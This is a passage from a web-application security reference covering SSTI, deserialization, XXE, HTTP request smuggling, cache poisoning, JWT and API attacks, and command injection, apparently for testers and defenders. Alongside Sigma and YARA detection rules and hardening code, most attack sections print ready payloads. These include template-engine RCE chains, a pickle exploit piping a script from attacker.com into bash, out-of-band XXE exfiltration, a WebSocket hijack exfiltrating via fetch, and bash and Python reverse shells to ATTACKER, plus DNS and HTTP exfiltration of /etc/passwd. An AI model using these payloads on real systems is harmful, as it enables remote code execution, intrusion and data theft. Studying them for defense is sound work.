    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    # Resolve DNS to prevent DNS rebinding
    import socket
    try:
        resolved_ip = socket.getaddrinfo(parsed.hostname, parsed.port or 443)[0][4][0]
    except socket.gaierror:
        return False
    ip = ipaddress.ip_address(resolved_ip)
    for network in BLOCKED_RANGES:
        if ip in network:
            return False
    return True
```

**Infrastructure-level:**
```bash
# AWS — enforce IMDSv2 on all instances
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890 \
  --http-tokens required \
  --http-endpoint enabled

# AWS — organization-wide SCP to enforce IMDSv2
# (blocks RunInstances without IMDSv2 requirement)
```

---

## 5. SSTI (Server-Side Template Injection)

### 5.1 Detection methodology

```
# Step 1 — Detect template engine (polyglot probe)
${{<%[%'"}}%\.

# Step 2 — Mathematical evaluation probes
{{7*7}}       → 49  (Jinja2, Twig, Angular)
${7*7}        → 49  (Freemarker, Velocity, Thymeleaf, EL)
<%= 7*7 %>    → 49  (ERB, EJS, JSP)
#{7*7}        → 49  (Pug/Jade, Slim)
{{7*'7'}}     → 7777777 (Jinja2 — string multiplication)
{{7*'7'}}     → 49  (Twig — numeric coercion)
```

### 5.2 Engine-specific RCE payloads

**Jinja2 (Python):**
```python
# MRO chain to subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__() }}   # list all subclasses
# Find Popen index (varies by Python version, typically ~250-400)
{{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate() }}

# Alternative via config/request objects (Flask)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}

# Bypass filters (no underscores)
{{ lipsum.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Bypass filters (no brackets)
{{ request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
```

**Twig (PHP):**
```php
// Twig 1.x
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

// Twig 2.x+ (registerUndefinedFilterCallback removed)
{{ ['id']|filter('system') }}
{{ ['cat /etc/passwd']|filter('exec') }}
{{ ['id']|map('exec') }}

// Twig 3.x — if sandbox is not enforced
{% set cmd = 'system' %}
{{ [cmd]|filter('assert') }}
```

**Freemarker (Java):**
```
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ ex("id") }

// Alternative via ObjectConstructor
<#assign classloader = object?api.class.protectionDomain.classLoader>
```

**ERB (Ruby):**
```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
```

**Velocity (Java):**
```
#set($runtime = $class.forName("java.lang.Runtime"))
#set($method = $runtime.getMethod("getRuntime", null))
#set($obj = $method.invoke(null, null))
#set($exec = $runtime.getMethod("exec", $class.forName("java.lang.String")))
$exec.invoke($obj, "id")
```

**Pug/Jade (Node.js):**
```
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
= x
```

| Engine | Language | Detection Probe | RCE Payload Type |
|---|---|---|---|
| Jinja2 | Python | `{{7*'7'}}` → `7777777` | MRO chain, `os.popen` |
| Twig | PHP | `{{7*'7'}}` → `49` | `filter('system')` |
| Freemarker | Java | `${7*7}` → `49` | `Execute` utility |
| Velocity | Java | `$class.inspect("java.lang.Runtime")` | Reflection |
| ERB | Ruby | `<%= 7*7 %>` → `49` | Direct `system()` |
| Pug | Node.js | `#{7*7}` → `49` | `child_process` |
| Thymeleaf | Java | `${7*7}` → `49` | SpEL injection |
| Smarty | PHP | `{7*7}` → `49` | `{system('id')}` |

### 5.3 Detection

```yaml
title: Server-Side Template Injection Probe
id: 2a3b4c5d-6e7f-8a9b-0c1d-2e3f4a5b6c7d
status: experimental
logsource:
  category: webserver
detection:
  selection_jinja:
    cs-uri-query|contains:
      - '{{7*7}}'
      - '{{config}}'
      - '__class__.__mro__'
      - '__subclasses__'
      - '__globals__'
  selection_twig:
    cs-uri-query|contains:
      - "filter('system')"
      - "filter('exec')"
      - '_self.env'
  selection_freemarker:
    cs-uri-query|contains:
      - 'freemarker.template.utility'
      - 'Execute'
      - '#assign'
  condition: selection_jinja or selection_twig or selection_freemarker
  level: critical
```

### 5.4 Defense

Never embed user input into the template source. Pass user data as template variables:
```python
# VULNERABLE — user input in template source
template = jinja2.Template(f"Hello {user_input}")

# SAFE — user input as template variable
template = jinja2.Template("Hello {{ name }}")
template.render(name=user_input)
```

Use sandboxed template environments:
```python
# Jinja2 sandbox (blocks access to dangerous attributes)
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
```

---

## 6. Deserialization attacks

### 6.1 The general pattern

Many languages provide serialization mechanisms that convert objects to byte streams and back. If the application deserializes untrusted data, the attacker can craft a serialized object that triggers arbitrary code execution through "gadget chains."

### 6.2 Java deserialization

**Enumeration and exploitation:**
```bash
# Detect Java deserialization endpoints
# Look for: Base64-encoded data starting with rO0AB (raw Java serialization)
# or Content-Type: application/x-java-serialized-object
# or ViewState parameters, JMX, RMI, T3 WebLogic protocol

# ysoserial — generate payloads for known gadget chains
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "curl attacker.com/shell.sh|bash" > payload.bin

# Send via HTTP
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin

# ysoserial gadget chains (ordered by prevalence)
```

| Chain | Library Required | Notes |
|---|---|---|
| CommonsCollections1-7 | Apache Commons Collections 3.x/4.x | Most common |
| CommonsBeanuils1 | Apache Commons Beanutils | Very common in Java EE |
| Spring1/2 | Spring Framework | Enterprise apps |
| Hibernate1/2 | Hibernate | ORM-based apps |
| JBossInterceptors1 | JBoss/WildFly | App servers |
| Groovy1 | Groovy | Jenkins, Gradle |
| MozillaRhino1/2 | Rhino JS engine | Bundled in older JDK |
| URLDNS | JDK built-in | Detection only (DNS callback, no RCE) |

```bash
# JNDI injection (Java 8u191 and below for remote codebase)
# Step 1: Start LDAP redirect server
java -jar marshalsec.jar marshalsec.jndi.LDAPRefServer \
  "http://attacker.com:8888/#Exploit"

# Step 2: Host Exploit.class on HTTP server
# Step 3: Trigger JNDI lookup via deserialization
java -jar ysoserial.jar JRMP 127.0.0.1 1099 > jrmp.bin

# Modern JNDI injection (Java 8u191+ bypass via local gadgets)
# ELProcessor gadget, BeanFactory with Tomcat
```

### 6.3 Python pickle

```python
# Craft malicious pickle payload
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh | bash",))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())

# Alternative using subprocess for output capture
class ExfilExploit:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (["id"],))
```

**YARA rule — pickle deserialization:**
```yara
rule Pickle_RCE_Payload {
    meta:
        description = "Detect pickle payloads with __reduce__ code execution"
    strings:
        $pickle_v2 = { 80 02 }
        $pickle_v4 = { 80 04 }
        $reduce = "__reduce__"
        $os_system = "os\nsystem"
        $subprocess = "subprocess\ncheck_output"
        $posix = "posix\nsystem"
    condition:
        ($pickle_v2 or $pickle_v4) at 0 and
        any of ($os_system, $subprocess, $posix, $reduce)
}
```

### 6.4 PHP deserialization

```bash
# PHPGGC — PHP gadget chain generator
phpggc Laravel/RCE1 system "id" -b    # base64 encoded
phpggc Symfony/RCE4 exec "id" -u      # URL encoded
phpggc Monolog/RCE1 system "id" -s    # serialized

# Common injection points:
# - PHP session files (session.serialize_handler mismatch)
# - Cookies with serialized data
# - Hidden form fields
# - API parameters accepting serialized PHP objects
```

| Framework | Chain | Sink | Trigger |
|---|---|---|---|
| Laravel | RCE1-RCE10 | `system()`, `eval()` | `__destruct`, `__wakeup` |
| Symfony | RCE1-RCE9 | `ProcessBuilder`, `eval()` | `__destruct` |
| WordPress | RCE1-RCE2 | `call_user_func()` | `__wakeup` |
| Magento | SQLI1, FW1 | SQL injection, file write | `__destruct` |
| CakePHP | RCE1-RCE2 | `proc_open()` | `__destruct` |

### 6.5 .NET deserialization

```bash
# ysoserial.net — .NET gadget chains
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c calc"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami > C:\\temp\\out.txt"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell -enc BASE64"

# ViewState deserialization (ASP.NET)
# If machineKey is known (from web.config disclosure):
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "cmd /c whoami" \
  --apppath="/" \
  --path="/page.aspx" \
  --decryptionalg="AES" \
  --decryptionkey="HEXKEY" \
  --validationalg="SHA1" \
  --validationkey="HEXKEY"
```

### 6.6 Node.js deserialization

The `node-serialize` package uses `eval()` internally when deserializing function expressions. Any serialized object containing an IIFE (Immediately Invoked Function Expression) executes on deserialization.

```javascript
// node-serialize — RCE via IIFE in serialized data
// The vulnerable pattern:
var serialize = require('node-serialize');
var userInput = '{"exploit":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id > /tmp/pwned\')}()"}';
serialize.unserialize(userInput);  // Executes the function immediately

// Crafting the payload
var payload = {
  rce: function() {
    require('child_process').exec('curl attacker.com/shell.sh | bash');
  }
};
// Serialize, then add () to make it an IIFE
var serialized = serialize.serialize(payload);
// Replace the trailing } with }() to auto-invoke
```

**funcster exploitation:**
```javascript
// funcster recreates functions from serialized objects
var funcster = require('funcster');

// Malicious serialized object — __js property contains arbitrary code
var malicious = {
  __js: "module.exports = function() { " +
        "require('child_process').execSync('id'); }"
};
funcster.deepDeserialize(malicious);  // RCE

// Payload via HTTP parameter:
// {"__js":"module.exports=function(){require('child_process').execSync('curl attacker.com/x|sh')}"}
```

**Defense:**
```javascript
// Never deserialize untrusted data with eval-based libraries
// Use JSON.parse() — it cannot execute code
var safe = JSON.parse(userInput);

// If schema validation needed:
const Ajv = require('ajv');
const ajv = new Ajv({ allErrors: true });
const schema = { type: 'object', properties: { name: { type: 'string' } }, additionalProperties: false };
const validate = ajv.compile(schema);
if (!validate(JSON.parse(userInput))) throw new Error('Invalid input');
```

### 6.7 Detection

**Sigma rule — Java deserialization attack:**
```yaml
title: Java Deserialization Attack Indicators
id: 4b5c6d7e-8f9a-0b1c-2d3e-4f5a6b7c8d9e
status: stable
logsource:
  category: webserver
detection:
  selection_header:
    content-type|contains: 'java-serialized-object'
  selection_body:
    cs-body|startswith: 'rO0AB'  # Base64 Java serialization magic bytes
  selection_payload:
    cs-body|contains:
      - 'java.lang.Runtime'
      - 'java.lang.ProcessBuilder'
      - 'javax.script.ScriptEngine'
      - 'com.sun.org.apache.xalan'
  condition: selection_header or selection_body or selection_payload
  level: critical
```

### 6.8 Defense

```java
// Java — ObjectInputFilter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;!*"  // Allow only model classes, deny everything else
);
ObjectInputStream ois = new ObjectInputStream(stream);
ois.setObjectInputFilter(filter);

// Java — avoid deserialization entirely; use JSON
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);  // STILL DANGEROUS
// SAFE: never enable default typing
MyObject obj = mapper.readValue(json, MyObject.class);
```

```python
# Python — never use pickle for untrusted data
# SAFE alternatives:
import json
data = json.loads(untrusted_input)

# If schema validation needed:
import pydantic
class SafeInput(pydantic.BaseModel):
    name: str
    value: int
validated = SafeInput.model_validate_json(untrusted_input)
```

---

## 7. XXE (XML External Entity)

### 7.1 In-band XXE

```xml
<!-- File read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>

<!-- Directory listing (Java XML parser) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/">
]>
<data>&xxe;</data>

<!-- PHP filter wrapper for base64-encoded file read -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>
```

### 7.2 Blind/OOB XXE

```xml
<!-- Step 1: Inject parameter entity referencing attacker's DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<data>trigger</data>

<!-- Step 2: evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;

<!-- FTP-based exfiltration (for multi-line file content) -->
<!-- evil.dtd with FTP exfiltration -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
```

### 7.3 XXE via file upload

```bash
# SVG file with XXE
echo '<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>' > xxe.svg

# DOCX file with XXE (modify word/document.xml inside the ZIP)
unzip document.docx -d docx_contents/
# Edit docx_contents/word/document.xml to include XXE entity
zip -r xxe.docx docx_contents/

# XLSX with XXE (modify xl/sharedStrings.xml)
# PDF with XXE (XFA forms in PDF)
```

### 7.4 Billion-laughs DoS

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<data>&lol9;</data>
<!-- Expands to ~3GB from a few hundred bytes -->
```

### 7.5 Defense per language

```java
// Java — disable DTD processing entirely
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);

// SAXParserFactory
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// XMLInputFactory (StAX)
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
```

```python
# Python (lxml) — disable entity resolution
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
doc = etree.parse(source, parser)

# Python (defusedxml — recommended)
import defusedxml.ElementTree as ET
tree = ET.parse(source)  # Blocks DTDs, external entities, entity expansion
```

```csharp
// .NET — prohibit DTD processing
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

---

## 8. HTTP request smuggling

### 8.1 Mechanism

When a front-end (reverse proxy, CDN, load balancer) and a back-end server disagree on where one HTTP request ends and the next begins, an attacker can "smuggle" a second request inside the first.

### 8.2 Variant details

**CL.TE (Content-Length front-end, Transfer-Encoding back-end):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: target.com
```
The front-end forwards 13 bytes (including the smuggled prefix). The back-end parses chunked encoding, sees `0\r\n\r\n` (end of chunks), and treats `GPOST /...` as the start of the next request.

**TE.CL (Transfer-Encoding front-end, Content-Length back-end):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
GPOST /
0

```
The front-end uses chunked, forwards everything through the final `0\r\n\r\n`. The back-end uses `Content-Length: 3`, reads only `8\r\n`, and treats the remainder as a new request.

**H2.CL desync (HTTP/2 → HTTP/1.1 downgrade):**
```
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com
```
HTTP/2 framing says the body is in the DATA frame. The `content-length: 0` header is ignored by the HTTP/2 front-end but used by the HTTP/1.1 back-end after downgrade.

### 8.3 Detection and exploitation tools

```bash
# smuggler — automated HTTP request smuggling detection
python3 smuggler.py -u https://target.com

# Burp Suite — HTTP Request Smuggler extension (Turbo Intruder based)
# Automated detection of CL.TE, TE.CL, TE.TE, and H2 variants

# Manual detection using curl (CL.TE probe)
curl -i -s -k -X POST 'https://target.com/' \
  -H 'Content-Length: 6' \
  -H 'Transfer-Encoding: chunked' \
  --data-raw $'0\r\n\r\nG'
# If next request gets 405 "Method Not Allowed" for GPOST → CL.TE confirmed
```

### 8.4 Exploitation scenarios

**Cache poisoning via smuggling:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 128
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
Content-Length: 100

GET /login HTTP/1.1
Host: attacker.com
```
The smuggled request poisons the cache for `/static/main.js` with attacker-controlled content.

**Credential theft:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 67
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 1000

```
The next legitimate user's request is appended as the body of the smuggled `/log` request, sending their cookies/headers to an attacker-controlled endpoint.

### 8.5 Defense

```nginx
# Nginx — reject ambiguous requests
proxy_http_version 1.1;
# Nginx rejects requests with both Content-Length and Transfer-Encoding by default

# HAProxy — strict HTTP parsing
option httplog
option http-server-close
option forwardfor
http-request deny if { req.hdr_cnt(content-length) gt 1 }
http-request deny if { req.hdr(transfer-encoding) -m found } { req.hdr(content-length) -m found }
```

---

## 9. Cache poisoning and web cache deception

### 9.1 Cache poisoning

```bash
# Step 1 — Identify unkeyed headers
# Use Param Miner (Burp extension) to find headers reflected in response but not in cache key

# Step 2 — Inject via unkeyed header
curl -H "X-Forwarded-Host: attacker.com" https://target.com/
# If response contains <script src="//attacker.com/analytics.js">
# and the cache stores this response → all users get attacker's JS

# Common unkeyed headers:
# X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, X-Rewrite-URL
# X-Forwarded-Port, X-Forwarded-Proto, X-Host

# Cache poisoning via fat GET
# Some servers process a body on GET requests
curl -X GET https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"callback":"<script>alert(1)</script>"}'
```

### 9.2 Web cache deception

```bash
# Step 1 — Trick victim into visiting crafted URL
# https://target.com/account/settings/anything.css
# The CDN caches the response (dynamic account page) because path ends in .css

# Step 2 — Attacker requests the same URL
curl https://target.com/account/settings/anything.css
# Gets the victim's cached account page with PII, tokens, etc.

# Path confusion variants:
# /account/settings/..%2f..%2fstatic/main.css
# /account/settings%0d%0a%0d%0a.css
# /account/settings;.css  (Tomcat path parameter)
```

### 9.3 Defense

```
# Cache configuration — Vary header
Cache-Control: private, no-store   # For authenticated endpoints
Vary: Cookie, Authorization         # Include auth in cache key

# CDN rules — only cache explicit content types
# Cloudflare Page Rule: Cache Level = Standard (only caches known static extensions)
# Ensure API responses include: Cache-Control: no-store
```

---

## 10. API security

### 10.1 BOLA/IDOR exploitation and detection

```bash
# Sequential ID enumeration
for i in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/users/$i/profile" \
    -o "user_$i.json" &
done

# UUID-based IDOR (harvest UUIDs from other endpoints)
# Check /api/v1/orders → contains user_id fields for other users
# Use those user_ids to access /api/v1/users/{id}/settings

# GraphQL IDOR
{
  user(id: "550e8400-e29b-41d4-a716-446655440000") {
    email
    ssn
    creditCards { number expiry }
  }
}

# Nuclei template for BOLA detection
# nuclei -u https://api.target.com -t bola-check.yaml
```

### 10.2 Mass assignment

```bash
# Discover hidden fields via API response analysis
curl -H "Authorization: Bearer $TOKEN" https://api.target.com/v1/users/me
# Response: {"id":1,"name":"test","email":"test@test.com","role":"user","isAdmin":false}

# Attempt mass assignment
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://api.target.com/v1/users/me \
  -d '{"name":"test","role":"admin","isAdmin":true}'
```

**Defense:**
```python
# Django REST Framework — explicit field whitelisting
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['name', 'email']  # Only these fields are writable
        read_only_fields = ['id', 'role', 'is_admin', 'created_at']
```

```javascript
// Express.js — input validation with allowlist
const Joi = require('joi');
const updateSchema = Joi.object({
  name: Joi.string().max(100),
  email: Joi.string().email(),
  // role, isAdmin intentionally excluded
}).options({ stripUnknown: true });
```

### 10.3 JWT attacks

```bash
# None algorithm attack
# Decode JWT, change alg to "none", remove signature
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
echo -n '{"sub":"admin","role":"admin"}' | base64 -w0
# Concatenate: header.payload.  (empty signature)

# Key confusion attack (RS256 → HS256)
# Step 1: Obtain the server's RSA public key
curl https://target.com/.well-known/jwks.json | jq -r '.keys[0]' > pubkey.json
# Step 2: Use public key as HMAC secret
python3 jwt_tool.py $TOKEN -X k -pk pubkey.pem

# kid (Key ID) injection
# Payload header: {"alg":"HS256","kid":"/dev/null"}
# If server reads key from file path in kid → HMAC key is empty string

# kid SQL injection
# Payload header: {"alg":"HS256","kid":"' UNION SELECT 'secret123' -- "}

# jku header injection
# Payload header: {"alg":"RS256","jku":"https://attacker.com/jwks.json"}
# Host matching public key at attacker-controlled URL

# jwt_tool — comprehensive JWT testing
python3 jwt_tool.py $TOKEN -M at   # All tests
python3 jwt_tool.py $TOKEN -C -d wordlist.txt  # Crack HMAC secret
```

| Attack | Condition | Impact |
|---|---|---|
| `alg: none` | Server accepts unsigned tokens | Full auth bypass |
| RS256→HS256 key confusion | Server accepts both alg types | Forge tokens with public key |
| `kid` path traversal | `kid` used as file path | Sign with known file content |
| `kid` SQL injection | `kid` in database query | Inject signing key |
| `jku` injection | Server fetches JWKS from header | Use attacker's key pair |
| Weak HMAC secret | Short/guessable secret | Crack and forge tokens |
| Expired token reuse | No expiry check | Permanent access |

### 10.4 Rate limiting and brute-force protection

```nginx
# Nginx rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $http_authorization zone=auth:10m rate=5r/m;

server {
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        limit_req_status 429;
    }
    location /api/login {
        limit_req zone=auth burst=3;
        limit_req_status 429;
    }
}
```

```python
# Django REST Framework throttling
REST_FRAMEWORK = {
    'DEFAULT_THROTTLE_CLASSES': [
        'rest_framework.throttling.AnonRateThrottle',
        'rest_framework.throttling.UserRateThrottle',
    ],
    'DEFAULT_THROTTLE_RATES': {
        'anon': '30/minute',
        'user': '100/minute',
        'login': '5/minute',
    }
}
```

### 10.5 gRPC, WebSocket, and webhook security

**gRPC reflection abuse:**
```bash
# Enumerate gRPC services via reflection
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 describe myapp.UserService
grpcurl -plaintext target.com:50051 myapp.UserService/GetUser \
  -d '{"id": 1}'

# Defense: disable reflection in production
# Go: remove grpc_reflection.Register(s) from server setup
# Java: do not call ProtoReflectionService.newInstance()
```

**Cross-Site WebSocket Hijacking (CSWSH):**
```html
<!-- Attacker page — steals WebSocket data using victim's cookies -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(e) {
  fetch('https://attacker.com/log?data=' + encodeURIComponent(e.data));
};
ws.onopen = function() {
  ws.send(JSON.stringify({action: 'getPrivateData'}));
};
</script>
```

**Defense:**
```python
# Validate Origin header in WebSocket handshake
ALLOWED_ORIGINS = {'https://target.com', 'https://www.target.com'}

async def websocket_connect(self, event):
    origin = dict(self.scope['headers']).get(b'origin', b'').decode()
    if origin not in ALLOWED_ORIGINS:
        await self.close(code=4003)
        return
    await self.accept()
```

**Webhook security:**
```python
# Webhook signature verification (HMAC-SHA256)
import hmac, hashlib

def verify_webhook(payload: bytes, signature: str, secret: str) -> bool:
    expected = hmac.new(
        secret.encode(), payload, hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(f"sha256={expected}", signature)

# Webhook URL validation — prevent SSRF
# Apply same SSRF protections from §4.6 to webhook callback URLs
```

---

## 11. Additional server-side injection vectors

### 11.1 LDAP injection

```bash
# Authentication bypass
username: *)(uid=*))(|(uid=*
password: anything

# Data extraction
username: *)(|(objectClass=*))(&(objectClass=person)(cn=*
```

### 11.2 CRLF injection

```bash
# HTTP header injection via CRLF
curl "https://target.com/redirect?url=http://legit.com%0d%0aSet-Cookie:%20admin=true"
# Injects a Set-Cookie header into the response

# HTTP response splitting
curl "https://target.com/page?param=value%0d%0a%0d%0a<html>Injected</html>"
```

### 11.3 Host header attacks

```bash
# Password reset poisoning
curl -X POST https://target.com/reset-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"
# If the app uses the Host header to generate the reset URL →
# victim receives: https://attacker.com/reset?token=SECRET

# Web cache poisoning via Host
curl -H "Host: attacker.com" https://target.com/
# If cached → all users get the attacker.com version

# Routing-based SSRF
curl -H "Host: internal-admin.target.com" https://target.com/
```

### 11.4 Race conditions

```bash
# TOCTOU (Time-of-Check/Time-of-Use) — coupon double-spend
# Send 20 parallel requests applying the same one-use coupon
for i in $(seq 1 20); do
  curl -X POST https://target.com/api/apply-coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"coupon":"SAVE50"}' &
done
wait

# Turbo Intruder (Burp extension) — single-packet attack
# Sends all requests in a single TCP packet for true simultaneity
# Script: race-single-packet-attack.py
```

**Defense:**
```sql
-- Database-level: SELECT FOR UPDATE (pessimistic locking)
BEGIN;
SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
COMMIT;

-- Optimistic locking with version column
UPDATE orders SET status = 'applied', version = version + 1
WHERE id = 123 AND version = 5;
-- If affected_rows = 0 → concurrent modification detected
```

---

## 12. Command injection

### 12.1 Mechanism

OS command injection occurs when an application incorporates user input into a system shell command without proper sanitization. The shell interprets metacharacters in the user input as command separators, redirections, or substitutions, allowing the attacker to execute arbitrary commands with the privileges of the application process.

### 12.2 Injection operators

| Operator | Behavior | Example |
|---|---|---|
| `;` | Sequential execution (Unix) | `; whoami` |
| `\|` | Pipe stdout to next command | `\| whoami` |
| `\|\|` | Execute if previous fails | `\|\| whoami` |
| `&&` | Execute if previous succeeds | `&& whoami` |
| `$()` | Command substitution (POSIX) | `$(whoami)` |
| `` ` `` | Command substitution (legacy) | `` `whoami` `` |
| `\n` / `%0a` | Newline as command separator | `%0awhoami` |
| `>` / `>>` | Output redirection | `> /tmp/out` |
| `<` | Input redirection | `< /etc/passwd` |

**Windows-specific:**

| Operator | Behavior | Example |
|---|---|---|
| `&` | Sequential execution | `& whoami` |
| `\|` | Pipe | `\| whoami` |
| `%0a` | Newline | `%0awhoami` |
| `^` | Escape char (bypass filters) | `wh^oami` |

### 12.3 Exploitation

```bash
# Basic injection in a ping utility (user controls 'host' parameter)
# Vulnerable endpoint: /api/ping?host=8.8.8.8
curl "https://target.com/api/ping?host=8.8.8.8;id"
curl "https://target.com/api/ping?host=8.8.8.8|whoami"
curl "https://target.com/api/ping?host=8.8.8.8%0aid"

# Reverse shell injection
curl "https://target.com/api/ping?host=8.8.8.8;bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261"
curl "https://target.com/api/ping?host=8.8.8.8|python3+-c+'import+socket,os,pty;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"

# Data exfiltration via DNS (blind)
curl "https://target.com/api/ping?host=8.8.8.8;nslookup+$(whoami).attacker.com"
curl "https://target.com/api/ping?host=8.8.8.8;curl+attacker.com/$(cat+/etc/passwd|base64|tr+-d+'%0a')"

# Command injection via filename
# Upload a file named: ;id;.txt
# If the app runs: convert <filename> output.pdf → executes 'id'
```

### 12.4 Blind command injection

```bash
# Time-based detection (Unix)
curl "https://target.com/api/ping?host=8.8.8.8;sleep+10"
# If response takes 10+ seconds → confirmed

# Time-based detection (Windows)
curl "https://target.com/api/ping?host=8.8.8.8&ping+-n+10+127.0.0.1"

# Out-of-band via DNS
curl "https://target.com/api/ping?host=8.8.8.8;nslookup+$(whoami).attacker.com"

# Out-of-band via HTTP
curl "https://target.com/api/ping?host=8.8.8.8;curl+attacker.com/?data=$(id|base64)"

# Out-of-band via ICMP (if outbound DNS/HTTP blocked)
curl "https://target.com/api/ping?host=8.8.8.8;ping+-c+1+-p+$(xxd+-p+-l+16+/etc/passwd)+attacker.com"

